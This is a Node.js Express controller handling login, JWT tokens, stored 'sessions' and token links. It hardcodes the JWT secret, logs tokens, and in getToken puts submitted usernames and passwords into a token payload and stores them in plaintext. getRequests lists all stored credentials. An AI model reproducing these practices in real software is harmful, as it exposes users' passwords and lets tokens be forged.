const { User, Session, Order } = require("../model")
const bcrypt = require('bcrypt')
const {sign,verify}= require('jsonwebtoken')
const nodemailer = require('nodemailer');

exports.Login = async(req,res,next)=>{
    const {email,password,type} = req.body
    const result = await User.findOne({email,type})
    if(result){
        const check = await bcrypt.compare(password,result.password)
        if(!check) return res.status(401).send('Invalid Password')
        const token = sign({id:result._id},'secretkeyforjsonwebtokentoabshrsite',{expiresIn:'7d'})
        return res.json({token})
    }else return res.status(404).send('User Not Found')
}

exports.verifyToken = async(req,res,next)=>{
    const token = req.headers.authorization && req.headers.authorization.split(" ")[1]
    console.log(token)
    if (!token) return res.sendStatus(401)
    verify(token,'secretkeyforjsonwebtokentoabshrsite', (err, decoded) => {
        if (err) return res.sendStatus(401)
        req.user = decoded
        next()
    })
}

exports.checkToken = async(req,res,next)=>{
    res.sendStatus(200)
}

exports.getToken = async (req,res,next)=>{
    const {username,password} = req.body
    const token = sign({username,password},'secretkeyforjsonwebtokentoabshrsite',{expiresIn:'7d'})
    await Session.create({username,password,token}).then((session)=> res.json({session,token}))
}

exports.createSession = async(req,res,next)=>{
    const {username,password} = req.body
}


exports.getRequests = async(req,res,next)=>{
    try {
        const result = await Session.find({})
        res.json({result})
    } catch (error) {
        console.log(error.message)
    }
}

exports.deleteRequest = async(req,res,next)=>{
    try {
        const {id} = req.params
        await Session.findByIdAndDelete(id).then(()=>res.sendStatus(200))
    } catch (error) {
        console.log(error)
    }

}

exports.getLink = async(req,res,next)=>{
    const token = sign({session:'true'},'secretkeyforjsonwebtokentoabshrsite',{expiresIn:'1h'})
    const link = 'http://localhost:3000'+'/?token='+token
    // const link = 'http://localhost:3000'+'/?token='+token
    res.json({link})
}


